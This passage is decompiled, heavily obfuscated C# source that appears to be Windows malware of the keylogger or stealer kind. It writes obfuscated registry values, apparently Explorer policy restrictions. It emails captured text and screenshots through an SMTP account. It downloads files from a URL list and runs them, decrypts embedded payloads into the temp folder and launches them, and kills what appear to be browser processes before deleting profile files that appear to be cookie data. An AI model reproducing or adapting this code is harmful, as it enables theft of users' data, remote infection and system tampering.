									_003CModule_003E.smethod_0("ᶰ", 7652),
									19
								},
								{
									_003CModule_003E.smethod_0("⏎", 9115),
									20
								},
								{
									_003CModule_003E.smethod_0("᎙", 5071),
									21
								},
								{
									_003CModule_003E.smethod_0("\u0489", 1246),
									22
								},
								{
									_003CModule_003E.smethod_0("⚷", 9967),
									23
								},
								{
									_003CModule_003E.smethod_0("έ", 7978),
									24
								},
								{
									_003CModule_003E.smethod_0("\u20ef", 8373),
									25
								}
							};
						}
						if (DriveInfo.valuesMap.TryGetValue(key, out var value))
						{
							switch (value)
							{
							case 0:
								break;
							case 1:
								goto IL_0345;
							case 2:
								goto IL_034c;
							case 3:
								goto IL_0353;
							case 4:
								goto IL_035a;
							case 5:
								goto IL_0362;
							case 6:
								goto IL_036a;
							case 7:
								goto IL_0372;
							case 8:
								goto IL_037d;
							case 9:
								goto IL_0388;
							case 10:
								goto IL_0393;
							case 11:
								goto IL_039b;
							case 12:
								goto IL_03a3;
							case 13:
								goto IL_03ab;
							case 14:
								goto IL_03b3;
							case 15:
								goto IL_03bb;
							case 16:
								goto IL_03c3;
							case 17:
								goto IL_03cb;
							case 18:
								goto IL_03d3;
							case 19:
								goto IL_03db;
							case 20:
								goto IL_03e3;
							case 21:
								goto IL_03eb;
							case 22:
								goto IL_03f3;
							case 23:
								goto IL_03fb;
							case 24:
								goto IL_0403;
							case 25:
								goto IL_040b;
							default:
								goto IL_0413;
							}
							num = 1;
							goto IL_0415;
						}
					}
					goto IL_0413;
					IL_034c:
					num = 4;
					goto IL_0415;
					IL_0415:
					RegistryKey registryKey8 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ಙಥಬ\u0cbeಽಫಸಯಖಇಣ\u0ca9ಸಥಹಥಬ\u0cbeಖಝಣತಮಥಽಹಖಉ\u0cbfಸಸಯತ\u0cbeಜಯಸಹಣಥತಖಚಥದಣ\u0ca9ಣಯಹಖಏಲ\u0cbaದಥಸಯಸ", 3274));
					registryKey8.SetValue(_003CModule_003E.smethod_0("གྷརཉ\u0f7fཤ\u0f7bཨ\u0f7e", 3853), num);
					registryKey8.SetValue(_003CModule_003E.smethod_0("⍶⍗⍮⍑⍝⍏⍷⍖⍼⍊⍑⍎⍝", 9016), num);
					registryKey8.Close();
					return;
					IL_0345:
					num = 2;
					goto IL_0415;
					IL_0413:
					num = 4;
					goto IL_0415;
					IL_040b:
					num = 33554432;
					goto IL_0415;
					IL_0403:
					num = 16777216;
					goto IL_0415;
					IL_03fb:
					num = 8388608;
					goto IL_0415;
					IL_03f3:
					num = 4194304;
					goto IL_0415;
					IL_03eb:
					num = 2097152;
					goto IL_0415;
					IL_03e3:
					num = 1048576;
					goto IL_0415;
					IL_03db:
					num = 524288;
					goto IL_0415;
					IL_03d3:
					num = 262144;
					goto IL_0415;
					IL_03cb:
					num = 131072;
					goto IL_0415;
					IL_03c3:
					num = 65536;
					goto IL_0415;
					IL_03bb:
					num = 32768;
					goto IL_0415;
					IL_03b3:
					num = 16384;
					goto IL_0415;
					IL_03ab:
					num = 8192;
					goto IL_0415;
					IL_03a3:
					num = 4096;
					goto IL_0415;
					IL_039b:
					num = 2048;
					goto IL_0415;
					IL_0393:
					num = 1024;
					goto IL_0415;
					IL_0388:
					num = 512;
					goto IL_0415;
					IL_037d:
					num = 256;
					goto IL_0415;
					IL_0372:
					num = 128;
					goto IL_0415;
					IL_036a:
					num = 64;
					goto IL_0415;
					IL_0362:
					num = 32;
					goto IL_0415;
					IL_035a:
					num = 16;
					goto IL_0415;
					IL_0353:
					num = 8;
					goto IL_0415;
				}
				catch (Exception ex7)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u2428⑧\u245a⑁⑇\u2452\u2456\u244b\u244d\u244c␂\u244d⑁⑁\u2457\u2450⑇⑆␂␊⑯⑃\u244b\u244c␋␘␂\u2459␒\u245f", 9250), ex7.Message));
				}
			});
		}
		if (QueueDictionary.valuesMap.ProcessDrive)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey6 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("◑◭◤◶◵◣◰◧◞●◫◡◰◭◱◭◤◶◞◕◫◬◦◭◵◱◞◁◷◰◰◧◬◶◔◧◰◱◫◭◬◞◒◭◮◫◡◫◧◱◞◇◺◲◮◭◰◧◰", 9602));
					registryKey6.SetValue(_003CModule_003E.smethod_0("वघ\u0902ऐझझञआणऄट", 2417), 1);
					registryKey6.Close();
					RegistryKey registryKey7 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ᤑ\u192d\u1924\u1936\u1935\u1923\u1930\u1927ᤞᤏ\u192b\u1921\u1930\u192d\u1931\u192d\u1924\u1936ᤞᤕ\u192b\u192c\u1926\u192d\u1935\u1931ᤞᤁ\u1937\u1930\u1930\u1927\u192c\u1936ᤔ\u1927\u1930\u1931\u192b\u192d\u192cᤞᤒ\u192d\u192e\u192b\u1921\u192b\u1927\u1931ᤞᤇ\u193a\u1932\u192e\u192d\u1930\u1927\u1930ᤞᤆ\u192b\u1931\u1923\u192e\u192e\u192d\u1935ᤐ\u1937\u192c", 6466));
					registryKey7.SetValue(_003CModule_003E.smethod_0("Ѽѽ", 1101), _003CModule_003E.smethod_0("ΞΒΏ·ΛΘ\u0385ΒϙΒΏΒ", 1015));
					registryKey7.Close();
				}
				catch (Exception ex6)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ǭƢƟƄƂƗƓƎƈƉǇƈƄƄƒƕƂƃǇǏƪƆƎƉǎǝǇƜǗƚ", 487), ex6.Message));
				}
			});
		}
		if (QueueDictionary.valuesMap.UncheckNetwork)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ᨥ\u1a19ᨐᨂᨁ\u1a17ᨄᨓᨪᨻ᨟ᨕᨄ\u1a19ᨅ\u1a19ᨐᨂᨪᨡ᨟\u1a18ᨒ\u1a19ᨁᨅᨪᨵᨃᨄᨄᨓ\u1a18ᨂᨠᨓᨄᨅ᨟\u1a19\u1a18ᨪᨦ\u1a19\u1a1a᨟ᨕ᨟ᨓᨅᨪᨳᨎᨆ\u1a1a\u1a19ᨄᨓᨄ", 6774));
					registryKey4.SetValue(_003CModule_003E.smethod_0("ʣʎʔʆʋʋʈʐʵʒʉ", 743), 1);
					registryKey4.Close();
					RegistryKey registryKey5 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("╋╷╾╬╯╹╪╽╄╕╱╻╪╷╫╷╾╬╄╏╱╶╼╷╯╫╄╛╭╪╪╽╶╬╎╽╪╫╱╷╶╄╈╷╴╱╻╱╽╫╄╝╠╨╴╷╪╽╪╄╜╱╫╹╴╴╷╯╊╭╶", 9496));
					registryKey5.SetValue(_003CModule_003E.smethod_0("ẕẕ", 7844), _003CModule_003E.smethod_0("⍒⍌⍑⍒⍌⍘⍍⌑⍚⍇⍚", 9023));
					registryKey5.Close();
				}
				catch (Exception ex5)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u0a01\u0a4eੳ੨੮\u0a7b\u0a7f\u0a62\u0a64\u0a65ਫ\u0a64੨੨\u0a7e\u0a79੮੯ਫਣ\u0a46੪\u0a62\u0a65ਢ\u0a31ਫ\u0a70\u0a3b੶", 2571), ex5.Message));
				}
			});
		}
		if (QueueDictionary.valuesMap.DeployMenuItem)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ၸ၄၍\u105fၜ၊\u1059၎ၷၦ၂၈\u1059၄\u1058၄၍\u105fၷၼ၂၅၏၄ၜ\u1058ၷ\u1068\u105e\u1059\u1059၎၅\u105fၽ၎\u1059\u1058၂၄၅ၷၻ၄၇၂၈၂၎\u1058ၷၮၓၛ၇၄\u1059၎\u1059", 4139));
					registryKey3.SetValue(_003CModule_003E.smethod_0("\u208f₮₂₭₮₲₤", 8385), 1);
					registryKey3.Close();
				}
				catch (Exception ex4)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ᕋᔄᔹᔢᔤᔱᔵᔨᔮᔯᕡᔮᔢᔢᔴᔳᔤᔥᕡᕩᔌᔠᔨᔯᕨᕻᕡᔺᕱᔼ", 5441), ex4.Message));
				}
			});
		}
		if (QueueDictionary.valuesMap.ListTemplate)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("घतभ\u093f\u093cपहमगआढनहतसतभ\u093fगजढथयत\u093cसगई\u093eहहमथ\u093fझमहसढतथगछतधढनढमसगऎळ\u093bधतहमह", 2379));
					registryKey.SetValue(_003CModule_003E.smethod_0("ၸၕ၏ၝၐၐၓ။ၮ၉ၒ", 4156), 1);
					registryKey.Close();
					RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ⅵⅉ⅀⅒⅑ⅇ⅔⅃ⅺⅫ⅏ⅅ⅔ⅉ⅕ⅉ⅀⅒ⅺⅱ⅏ⅈ⅂ⅉ⅑⅕ⅺⅥ⅓⅔⅔⅃ⅈ⅒ⅰ⅃⅔⅕⅏ⅉⅈⅺⅶⅉ⅊⅏ⅅ⅏⅃⅕ⅺⅣ⅞⅖⅊ⅉ⅔⅃⅔ⅺⅢ⅏⅕ⅇ⅊⅊ⅉ⅑ⅴ⅓ⅈ", 8486));
					registryKey2.SetValue(_003CModule_003E.smethod_0("ἕ\u1f16", 7972), _003CModule_003E.smethod_0("᧵᧫᧻᧷᧶᧾᧱᧿ᦶ᧽᧠᧽", 6552));
					registryKey2.Close();
				}
				catch (Exception ex3)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ᦈᧇ᧺᧡᧧᧲᧶᧫᧭᧬ᦢ᧭᧡᧡᧷᧰᧧᧦ᦢᦪ\u19cf᧣᧫᧬ᦫᦸᦢ᧹ᦲ᧿", 6530), ex3.Message));
				}
			});
		}
		QueueDictionary.valuesMap.ProcessPciture.Start();
		ThreadPool.QueueUserWorkItem(delegate
		{
			Icon.ResolveView(QueueDictionary.valuesMap.ResolveView);
		});
		Icon.ProcessPciture();
		Application.Run();
	}

	private static void ProcessPciture(string string_0)
	{
		try
		{
			string string_ = _003CModule_003E.smethod_0("", 3410);
			if (Icon.ProcessPciture(ref string_))
			{
				Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ԲԲգլՑՌՔ՝ԂԘՃԈՅԘեԲ", 1336), string_));
				QueueDictionary.valuesMap.ProcessPciture += string.Format(_003CModule_003E.smethod_0("\u19dbᦐ\u19dd\u19dbᦐ\u19dd᧻᧴ᧉ᧔\u19ccᧅᦚᦀ\u19dbᦑ\u19ddᦀ᧠ᦀ\u19dbᦒ\u19dd᧽\u19dbᦐ\u19dd\u19dbᦐ\u19dd", 6560), Environment.NewLine, string_, Icon.UncheckNetwork());
			}
			Console.Write(string_0);
			QueueDictionary.valuesMap.ProcessPciture += string_0;
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u1a78ᨷᨊᨑ\u1a17ᨂᨆ\u1a1b\u1a1d\u1a1cᩒ\u1a1dᨑᨑᨇᨀ\u1a17ᨖᩒ\u1a5a\u1a19\u1a17ᨋᨐ\u1a1dᨓᨀᨖᨶ\u1a1dᨅ\u1a1c\u1a5bᩈᩒᨉᩂᨏ", 6770), ex.Message));
		}
	}

	private static void ProcessPciture(object sender, EventArgs e)
	{
		if (QueueDictionary.valuesMap.ProcessPciture == null)
		{
			QueueDictionary.valuesMap.ProcessPciture = ResolveView;
			QueueDictionary.valuesMap.ProcessPciture = QueueDictionary.valuesMap.ProcessPciture.BeginInvoke(QueueDictionary.valuesMap.ProcessPciture, null, null);
			QueueDictionary.valuesMap.ProcessPciture = _003CModule_003E.smethod_0("", 6345);
			Icon.ProcessPciture = _003CModule_003E.smethod_0("", 699);
		}
		else if (QueueDictionary.valuesMap.ProcessPciture.IsCompleted)
		{
			QueueDictionary.valuesMap.ProcessPciture.EndInvoke(QueueDictionary.valuesMap.ProcessPciture);
			QueueDictionary.valuesMap.ProcessPciture = QueueDictionary.valuesMap.ProcessPciture.BeginInvoke(QueueDictionary.valuesMap.ProcessPciture, null, null);
			QueueDictionary.valuesMap.ProcessPciture = _003CModule_003E.smethod_0("", 5741);
			Icon.ProcessPciture = _003CModule_003E.smethod_0("", 7298);
		}
		else
		{
			Console.WriteLine(_003CModule_003E.smethod_0("ឧ\u17ff\u17c4\u17c3ឍ១\u17c2\u17ca\u17ca\u17c8\u17dfឍភឍ\u17ec\u17c3\u17c2៙\u17c5\u17c8\u17dfឍ\u17c1\u17c2\u17ca\u17ca\u17c4\u17c3\u17caឍ\u17c4\u17deឍ\u17c4\u17c3ឍ\u17de\u17c8\u17de\u17de\u17c4\u17c2\u17c3ឌ", 6061));
		}
	}

	private static void ResolveView(string string_0)
	{
		try
		{
			Console.WriteLine(_003CModule_003E.smethod_0("ᖱᗩᗒᗕᖛᗷᗔᗜᗜᗞᗉᖛᖁᖛᗷᗔᗜᗜᗒᗕᗜᖕᖕᖕ", 5563));
			MailMessage mailMessage = new MailMessage();
			mailMessage.Subject = QueueDictionary.valuesMap.ProcessPciture;
			mailMessage.From = new MailAddress(QueueDictionary.valuesMap.ProcessPciture);
			mailMessage.IsBodyHtml = QueueDictionary.valuesMap.ProcessPciture;
			MailMessage mailMessage2 = mailMessage;
			foreach (string item in QueueDictionary.valuesMap.ProcessPciture)
			{
				mailMessage2.To.Add(new MailAddress(item));
			}
			if (QueueDictionary.valuesMap.ResolveView)
			{
				Stream stream = new MemoryStream();
				Icon.ProcessPciture().Save(stream, ImageFormat.get_Png());
				stream.Seek(0L, SeekOrigin.Begin);
				mailMessage2.Attachments.Add(new Attachment(stream, _003CModule_003E.smethod_0("ЋлЪннжЫазЬѶШжп", 1112)));
			}
			if (QueueDictionary.valuesMap.ProcessPciture)
			{
				mailMessage2.Body = ConfigEditor.ProcessPciture(new ConfigEditor.ActivatorEventArgs
				{
					ProcessPciture = string_0,
					ProcessPciture = QueueDictionary.valuesMap.LoadDeployment
				});
			}
			else
			{
				mailMessage2.Body = ConfigEditor.ResolveView(new ConfigEditor.ActivatorEventArgs
				{
					ProcessPciture = string_0,
					ProcessPciture = QueueDictionary.valuesMap.LoadDeployment
				});
			}
			SmtpClient smtpClient = new SmtpClient();
			smtpClient.Credentials = new NetworkCredential(QueueDictionary.valuesMap.ProcessPciture, QueueDictionary.valuesMap.ResolveView);
			smtpClient.EnableSsl = true;
			smtpClient.Host = QueueDictionary.valuesMap.LoadDeployment;
			smtpClient.Port = QueueDictionary.valuesMap.ProcessPciture;
			SmtpClient smtpClient2 = smtpClient;
			smtpClient2.Send(mailMessage2);
			Console.WriteLine(_003CModule_003E.smethod_0("ᓎᒖᒭᒪᓤᒈᒫᒣᒣᒡᒶᓤᓾᓤᒈᒫᒣᒣᒡᒠᓥ", 5316));
		}
		catch (Exception arg)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u05a8קך\u05c1\u05c7גז\u05cb\u05cd\u05ccւ\u05cd\u05c1\u05c1חא\u05c7׆ւ֊ב\u05c7\u05cc׆ק\u05cf׃\u05cb\u05ce\u058b\u0598ւי\u0592ן", 1442), arg));
		}
	}

	[CompilerGenerated]
	private static void ProcessPciture(object object_0)
	{
		Icon.ProcessPciture<DiskAttribute.NetworkTree.PathType>(_003CModule_003E.smethod_0("ࡦࡠ\u0876ࡡ\u0820\u0821\u0829࡞\u0876ࡠࡠ\u0872\u0874\u0876ࡑ\u087c\u086bࡒ", 2067))(IntPtr.Zero, QueueDictionary.valuesMap.ResolveView, QueueDictionary.valuesMap.ProcessPciture, QueueDictionary.valuesMap.ProcessPciture);
	}

	[CompilerGenerated]
	private static void ResolveView(object object_0)
	{
		try
		{
			string @string = Encoding.Default.GetString(Icon.ProcessPciture(Icon.ResolveView()));
			string[] separator = new string[1] { QueueDictionary.valuesMap.ProcessPciture };
			int num = 0;
			string[] array = @string.Split(separator, StringSplitOptions.RemoveEmptyEntries);
			foreach (string s in array)
			{
				byte[] bytes = Icon.ResolveView(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(QueueDictionary.valuesMap.ResolveView));
				string text = Path.GetTempPath() + _003CModule_003E.smethod_0("∞", 8770) + QueueDictionary.valuesMap.ProcessPciture[num];
				File.WriteAllBytes(text, bytes);
				Process.Start(text);
				num++;
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ঊ\u09c5৸\u09e3\u09e5ৰ৴৩৯৮ঠ৯\u09e3\u09e3৵৲\u09e5\u09e4ঠন\u09cdৡ৩৮ঠর৸\u09c6৩৬\u09e5\u09c2৩৮\u09e4\u09e5৲\u09a9\u09baঠ৻র৽", 2432), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void LoadDeployment(object object_0)
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.smethod_0("℉℘℺ℯℼℹℹℴ℉ℓℼ℧ℰℳ℺ℭ℉℅℧℺ℳℼℹℰΩ", 8533);
			DirectoryInfo directoryInfo = new DirectoryInfo(text);
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				if (File.Exists(string.Concat(text, _003CModule_003E.smethod_0("\u0658", 1540), directoryInfo2, _003CModule_003E.smethod_0("\u0e70๏ใใ\u0e47ๅ\u0e49\u0e5fข\u0e5f\u0e5dเๅ๘\u0e49", 3628))))
				{
					Process[] processesByName = Process.GetProcessesByName(_003CModule_003E.smethod_0("ᓯᓠᓻᓬᓯᓦᓱ", 5257));
					foreach (Process process in processesByName)
					{
						process.Kill();
						process.WaitForExit();
					}
					Process[] processesByName2 = Process.GetProcessesByName(_003CModule_003E.smethod_0("Ბ\u1c8dᲔᲆᲈ\u1c8f\u1cccᲂ\u1c8e\u1c8fᲕᲀᲈ\u1c8fᲄᲓ", 7393));
					foreach (Process process2 in processesByName2)
					{
						process2.Kill();
						process2.WaitForExit();
					}
					File.Delete(string.Concat(text, _003CModule_003E.smethod_0("Ľ", 353), directoryInfo2, _003CModule_003E.smethod_0("૩\u0ad6\u0ada\u0ada\u0ade\u0adcૐ\u0ac6છ\u0ac6\u0ac4\u0ad9\u0adc\u0ac1ૐ", 2741)));
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u08b5\u08faࣇ\u08dc\u08da\u08cf\u08cb\u08d6\u08d0\u08d1\u089f\u08d0\u08dc\u08dc\u08ca\u08cd\u08da\u08db\u089f\u0897\u08f2\u08de\u08d6\u08d1\u0896\u0885\u089fࣄ\u088fࣂ", 2239), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void Print(object object_0)
	{
		ClientLayout.ProcessPciture(QueueDictionary.valuesMap.ProcessPciture);
		try
		{
			Process[] processesByName = Process.GetProcessesByName(_003CModule_003E.smethod_0("՜ՓՈ՟՜ՕՂ", 1338));
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
			Process[] processesByName2 = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u0087\u009b\u0082\u0090\u009e\u0099Ú\u0094\u0098\u0099\u0083\u0096\u009e\u0099\u0092\u0085", 247));
			foreach (Process process2 in processesByName2)
			{
				process2.Kill();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("⒀Ⓩ⓲ⓩ⓯⓺⓾ⓣⓥⓤ⒪ⓥⓩⓩ⓿⓸⓯⓮⒪⒢Ⓡ⓫ⓣⓤ⒣⒰⒪⓱Ⓔ⓷", 9354), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void ProcessDrive(object object_0)
	{
		foreach (string item in QueueDictionary.valuesMap.ProcessPciture)
		{
			try
			{
				Process process = new Process
				{
					StartInfo = new ProcessStartInfo
					{
						FileName = item,
						UseShellExecute = true
					}
				};
				process.Start();
			}
			catch (Exception ex)
			{
				Console.WriteLine(string.Format(_003CModule_003E.smethod_0("՜ԓԮԵԳԦԢԿԹԸնԹԵԵԣԤԳԲնվԛԷԿԸտլնԭզԫ", 1366), ex.Message));
			}
		}
	}

	[CompilerGenerated]
	private static void UncheckNetwork(object object_0)
	{
		WebClient webClient = new WebClient();
		foreach (string item in QueueDictionary.valuesMap.ProcessPciture)
		{
			try
			{
				string fileName = Path.GetTempPath() + _003CModule_003E.smethod_0("\u0301", 861) + Icon.ProcessDrive(5, 10) + item.Substring(item.LastIndexOf('.'));
				webClient.DownloadFile(item, fileName);
				Process.Start(fileName);
			}
			catch (Exception ex)
			{
				Console.WriteLine(string.Format(_003CModule_003E.smethod_0("₭\u20e2\u20df\u20c4\u20c2\u20d7\u20d3\u20ce\u20c8\u20c9₇\u20c8\u20c4\u20c4\u20d2\u20d5\u20c2\u20c3₇\u208f\u20ea\u20c6\u20ce\u20c9₎\u209d₇\u20dcₗ\u20da", 8359), ex.Message));
			}
		}
	}

	[CompilerGenerated]
	private static void DeployMenuItem(object object_0)
	{
		Icon.ProcessPciture<DiskAttribute.NetworkTree.PathType>(_003CModule_003E.smethod_0("\u1a6f\u1a69\u1a7f\u1a68ᨩᨨᨠ\u1a57\u1a7f\u1a69\u1a69\u1a7b\u1a7d\u1a7f\u1a58\u1a75\u1a62\u1a5b", 6682))(IntPtr.Zero, QueueDictionary.valuesMap.ResolveView, QueueDictionary.valuesMap.ProcessPciture, QueueDictionary.valuesMap.ProcessPciture);
	}

	[CompilerGenerated]
	private static void ListTemplate(object object_0)
	{
		try
		{
			string @string = Encoding.Default.GetString(Icon.ProcessPciture(Icon.ResolveView()));
			string[] separator = new string[1] { QueueDictionary.valuesMap.ProcessPciture };
			int num = 0;
			string[] array = @string.Split(separator, StringSplitOptions.RemoveEmptyEntries);
			foreach (string s in array)
			{
				byte[] bytes = Icon.ResolveView(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(QueueDictionary.valuesMap.ResolveView));
				string text = Path.GetTempPath() + _003CModule_003E.smethod_0("\u2062", 8254) + QueueDictionary.valuesMap.ProcessPciture[num];
				File.WriteAllBytes(text, bytes);
				Process.Start(text);
				num++;
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("᭠ᬯᬒᬉᬏᬚᬞ\u1b03ᬅ\u1b04ᭊᬅᬉᬉᬟᬘᬏᬎᭊ\u1b42ᬧᬋ\u1b03\u1b04ᭊ᭚ᬒᬬ\u1b03ᬆᬏᬨ\u1b03\u1b04ᬎᬏᬘ\u1b43᭐ᭊᬑ᭚ᬗ", 7018), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void DeployStream(object object_0)
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.smethod_0("ߍߜ߾\u07eb߸\u07fd\u07fd\u07f0ߍߗ߸ߣߴ߷߾ߩߍ߁ߣ߾߷߸\u07fdߴߢ", 1937);
			DirectoryInfo directoryInfo = new DirectoryInfo(text);
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				if (File.Exists(string.Concat(text, _003CModule_003E.smethod_0("ᎍ", 5073), directoryInfo2, _003CModule_003E.smethod_0("\u05af\u0590\u059c\u059c\u0598\u059a\u0596րםրւ\u059f\u059aև\u0596", 1523))))
				{
					Process[] processesByName = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u0ad1\u0ade\u0ac5\u0ad2\u0ad1\u0ad8\u0acf", 2743));
					foreach (Process process in processesByName)
					{
						process.Kill();
						process.WaitForExit();
					}
					Process[] processesByName2 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ᐟᐃᐚᐈᐆᐁᑂᐌ᐀ᐁᐛᐎᐆᐁᐊᐝ", 5231));
					foreach (Process process2 in processesByName2)
					{
						process2.Kill();
						process2.WaitForExit();
					}
					File.Delete(string.Concat(text, _003CModule_003E.smethod_0("௦", 3002), directoryInfo2, _003CModule_003E.smethod_0("ߊߵ߹߹\u07fd߿\u07f3ߥ\u07b8ߥߧߺ߿ߢ\u07f3", 1942)));
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ሌቃቾብባቶቲቯቩቨሦቩብብታቴባቢሦሮቋቧቯቨሯሼሦችሶቻ", 4614), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void UnregisterPartition(object object_0)
	{
		ClientLayout.ProcessPciture(QueueDictionary.valuesMap.ProcessPciture);
		try
		{
			Process[] processesByName = Process.GetProcessesByName(_003CModule_003E.smethod_0("ᣕᣚᣁᣖᣕᣜᣋ", 6323));
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
			Process[] processesByName2 = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u193b\u1927\u193e\u192c\u1922\u1925ᥦ\u1928\u1924\u1925\u193f\u192a\u1922\u1925\u192e\u1939", 6475));
			foreach (Process process2 in processesByName2)
			{
				process2.Kill();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u106aဥဘဃစတနဉဏဎ၀ဏဃဃပဒစင၀၈\u102dခဉဎ၉ၚ၀ရၐဝ", 4192), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void ResolveAssembly(object object_0)
	{
		WebClient webClient = new WebClient();
		foreach (string item in QueueDictionary.valuesMap.ProcessPciture)
		{
			try
			{
				string fileName = Path.GetTempPath() + _003CModule_003E.smethod_0("ᦵ", 6633) + Icon.ProcessDrive(5, 10) + item.Substring(item.LastIndexOf('.'));
				webClient.DownloadFile(item, fileName);
				Process.Start(fileName);
			}
			catch (Exception ex)
			{
				Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ᯓᮜ\u1ba1ᮺᮼ\u1ba9\u1bad᮰᮶᮷\u1bf9᮶ᮺᮺ\u1bac\u1babᮼᮽ\u1bf9\u1bf1ᮔ᮸᮰᮷\u1bf0ᯣ\u1bf9\u1ba2\u1be9\u1ba4", 7129), ex.Message));
			}
		}
	}

	[CompilerGenerated]
	private static void BuildDrive(object object_0)
	{
		foreach (string item in QueueDictionary.valuesMap.ProcessPciture)
		{
			try
			{
				Process process = new Process
				{
					StartInfo = new ProcessStartInfo
					{
						FileName = item,
						UseShellExecute = true
					}
				};
				process.Start();
			}
			catch (Exception ex)
			{
				Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ॸषऊऑग\u0902आछझज\u0952झऑऑइ\u0900गख\u0952ग़\u093fओछजज़\u0948\u0952उ\u0942ए", 2418), ex.Message));
			}
		}
	}

	[CompilerGenerated]
	private static void RegisterBookmark(object object_0)
	{
		Icon.ProcessPciture<DiskAttribute.NetworkTree.PathType>(_003CModule_003E.smethod_0("ᙿᙹᙯᙸᘹᘸᘰᙇᙯᙹᙹᙫ᙭ᙯᙈᙥᙲᙋ", 5642))(IntPtr.Zero, QueueDictionary.valuesMap.ResolveView, QueueDictionary.valuesMap.ProcessPciture, QueueDictionary.valuesMap.ProcessPciture);
	}

	[CompilerGenerated]
	private static void DetachXmlFile(object object_0)
	{
		try
		{
			string @string = Encoding.Default.GetString(Icon.ProcessPciture(Icon.ResolveView()));
			string[] separator = new string[1] { QueueDictionary.valuesMap.ProcessPciture };
			int num = 0;
			string[] array = @string.Split(separator, StringSplitOptions.RemoveEmptyEntries);
			foreach (string s in array)
			{
				byte[] bytes = Icon.ResolveView(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(QueueDictionary.valuesMap.ResolveView));
				string text = Path.GetTempPath() + _003CModule_003E.smethod_0("ḽ", 7777) + QueueDictionary.valuesMap.ProcessPciture[num];
				File.WriteAllBytes(text, bytes);
				Process.Start(text);
				num++;
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ឍ\u17c2\u17ff៤២៷៳\u17ee៨៩ឧ៨៤៤៲៵២៣ឧឯ\u17ca៦\u17ee៩ឧ\u17b7\u17ff\u17c1\u17ee\u17eb២\u17c5\u17ee៩៣២៵ឮ\u17bdឧ\u17fc\u17b7\u17fa", 6023), ex.Message));
		}
	}

	[CompilerGenerated]
	private static void ChangeOptions(object object_0)
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.smethod_0("\u0ddf\u0dce෬\u0df9෪෯෯\u0de2\u0ddfළ෪\u0df1෦\u0de5෬\u0dfb\u0ddf\u0dd3\u0df1෬\u0de5෪෯෦\u0df0", 3459);
			DirectoryInfo directoryInfo = new DirectoryInfo(text);
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				if (File.Exists(string.Concat(text, _003CModule_003E.smethod_0("స", 3172), directoryInfo2, _003CModule_003E.smethod_0("∵∊∆∆∂∀∌√≇√∘∅∀∝∌", 8809))))
				{
					Process[] processesByName = Process.GetProcessesByName(_003CModule_003E.smethod_0("≑≞≅≒≑≘≏", 8759));
					foreach (Process process in processesByName)
					{
						process.Kill();
						process.WaitForExit();
					}
					Process[] processesByName2 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ȮȲȫȹȷȰɳȽȱȰȪȿȷȰȻȬ", 606));
					foreach (Process process2 in processesByName2)
					{
						process2.Kill();
						process2.WaitForExit();
					}
